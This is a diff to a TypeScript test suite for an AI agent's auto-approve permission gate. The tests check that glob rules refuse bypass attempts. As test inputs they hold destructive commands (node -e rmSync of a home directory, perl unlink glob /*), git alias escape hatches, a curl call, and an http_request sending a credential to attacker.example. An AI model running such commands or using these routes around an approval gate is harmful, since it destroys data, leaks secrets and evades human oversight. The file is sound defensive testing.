@@ -7,6 +7,7 @@ import {
   globToRegExp,
   matchAutoApprove,
   parseAutoApproveEntry,
+  validAutoApproveEntry,
 } from "./auto-approve.ts";
 
 const call = (name: string, input: unknown) => ({ callId: "c1", name, input });
@@ -60,6 +61,34 @@ describe("globToRegExp", () => {
     expect(globToRegExp(literal).test("rm readme.tmp")).toBe(false);
     expect(globToRegExp(globEscape("a?b")).test("a?b")).toBe(true);
     expect(globToRegExp(globEscape("a?b")).test("axb")).toBe(false);
+  });
+
+  it("anchors hard: a trailing newline does not satisfy the end", () => {
+    expect(globToRegExp("git status").test("git status\n")).toBe(false);
+    expect(globToRegExp("git status").test("git status")).toBe(true);
+  });
+});
+
+describe("validAutoApproveEntry", () => {
+  it("accepts a bare registry-safe name and a patterned entry", () => {
+    expect(validAutoApproveEntry("bash")).toBe(true);
+    expect(validAutoApproveEntry("bash:git *")).toBe(true);
+    expect(validAutoApproveEntry("http_request:POST")).toBe(true);
+    // A colon-named tool has no bare form: `evil:x` reads as a pattern for
+    // tool `evil` (documented; the PATCH validates entries with this).
+    expect(validAutoApproveEntry("evil:x")).toBe(true);
+  });
+
+  it("rejects an empty or colon-leading tool half", () => {
+    expect(validAutoApproveEntry("")).toBe(false);
+    expect(validAutoApproveEntry(":pattern")).toBe(false);
+    expect(validAutoApproveEntry("tool with spaces:x")).toBe(false);
+  });
+
+  it("caps the wildcards — a long *a*a… chain would backtrack the gate", () => {
+    expect(validAutoApproveEntry("bash:git *")).toBe(true);
+    expect(validAutoApproveEntry("bash:a*b*c*d*e*")).toBe(false);
+    expect(validAutoApproveEntry(`bash:${"*a".repeat(10)}b`)).toBe(false);
   });
 });
 
@@ -150,6 +179,44 @@ describe("matchAutoApprove", () => {
     expect(kindOf(["bash:git *"], "bash", { script: "!rm -rf ~" })).toBe("none");
     // A payload text may carry `!` — the hatch rule is shell-only.
     expect(kindOf(["send_message:Hello!"], "send_message", { body: "Hello!" })).toBe("pattern");
+  });
+
+  it("git's config escape hatches are refused", () => {
+    // Config-from-env: the alias value never appears in the text.
+    expect(kindOf(["bash:git *"], "bash", { script: "git --config-env=alias.p=EVIL p" })).toBe(
+      "none",
+    );
+    // A stored alias runs on a LATER plain call any `git *` approves.
+    expect(
+      kindOf(["bash:git *"], "bash", { script: "git config --global alias.p '!node -e 1'" }),
+    ).toBe("none");
+    expect(kindOf(["bash:git *"], "bash", { script: "git config alias.p '!x'" })).toBe("none");
+  });
+
+  it("interpreter eval flags are refused on their head words", () => {
+    expect(
+      kindOf(["bash:node *"], "bash", {
+        script: "node -e \"require('fs').rmSync('/home/x', { recursive: true })\"",
+      }),
+    ).toBe("none");
+    expect(kindOf(["bash:perl *"], "bash", { script: "perl -e 'unlink glob /*'" })).toBe("none");
+    expect(kindOf(["bash:node *"], "bash", { script: "node --version" })).toBe("pattern");
+  });
+
+  it("EVERY candidate text must match the glob — one benign field cannot vouch for the others", () => {
+    expect(
+      kindOf(["bash:git *"], "bash", { command: "git status", script: "curl https://x/y" }),
+    ).toBe("none");
+    // The http_request card shape: a rule over one field must not be
+    // satisfied by that field alone while the others differ.
+    expect(
+      kindOf(["http_request:POST"], "http_request", {
+        method: "POST",
+        url: "https://attacker.example/steal",
+        host: "attacker.example",
+        credential: "GH",
+      }),
+    ).toBe("none");
   });
 
   it("a pattern on another tool never matches", () => {
